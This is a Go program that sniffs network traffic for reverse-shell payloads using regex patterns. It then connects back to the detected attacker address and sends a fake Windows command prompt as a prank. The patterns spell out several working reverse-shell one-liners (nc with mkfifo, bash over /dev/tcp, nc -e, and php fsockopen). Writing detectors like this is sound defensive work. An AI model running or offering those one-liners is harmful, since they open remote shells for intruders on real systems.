package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"regexp"
	"strconv"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

var (
	device            = flag.String("i", "eth0", "interface to capture traffic from")
	filter            = flag.String("f", "port 80", "tcpdump filter")
	snapshotLen int32 = 32768
	promiscuous       = flag.Bool("p", false, "promiscuous mode")
	help              = flag.Bool("help", false, "display this help screen")
	err         error
	handle      *pcap.Handle
	regexes     = []string{
		`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}) (\d{3,5}) >/tmp/f`,
		`bash -i >& /dev/tcp/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/(\d{3,5}) 0>&1`,
		`nc -e /bin/sh (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}) (\d{3,5})`,
		`php -r '$sock=fsockopen("(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})",(\d{3,5}));exec("/bin/sh -i <&3 >&3 2>&3");'`,
	}
	regexesCompiled []*regexp.Regexp
	messageWindows  = `
Microsoft Windows [Version 10.0.16299.1331]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Windows\System32>`
)

func main() {
	flag.Parse()

	for _, regex := range regexes {
		regexesCompiled = append(regexesCompiled, regexp.MustCompile(regex))
	}

	fmt.Println("[+] Get ready to troll! Snowscan / 2019")
	handle, err = pcap.OpenLive(*device, snapshotLen, *promiscuous, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	err = handle.SetBPFFilter(*filter)
	if err != nil {
		log.Fatal(err)
	}

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		processPacket(packet)
	}
}

func processPacket(packet gopacket.Packet) {
	applicationLayer := packet.ApplicationLayer()
	if applicationLayer != nil {
		app := string(applicationLayer.Payload())
		for _, regex := range regexesCompiled {
			match := regex.FindStringSubmatch(app)
			if len(match) == 3 {
				ip := match[1]
				port, _ := strconv.Atoi(match[2])
				fmt.Printf("[+] Rev shell payload detected: %s:%d -- %s\n", ip, port, regex)
				sendFakeShell(ip, port)
			}
		}
	}
}

func sendFakeShell(ip string, port int) {
	host := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.DialTimeout("tcp", host, 1*time.Second)
	if err == nil {
		fmt.Printf("[*] Successfully sent a fake shell to %s!\n", host)
		fmt.Fprintf(conn, messageWindows)
		buffer := make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
		conn.Read(buffer)
		conn.Close()
	}
}
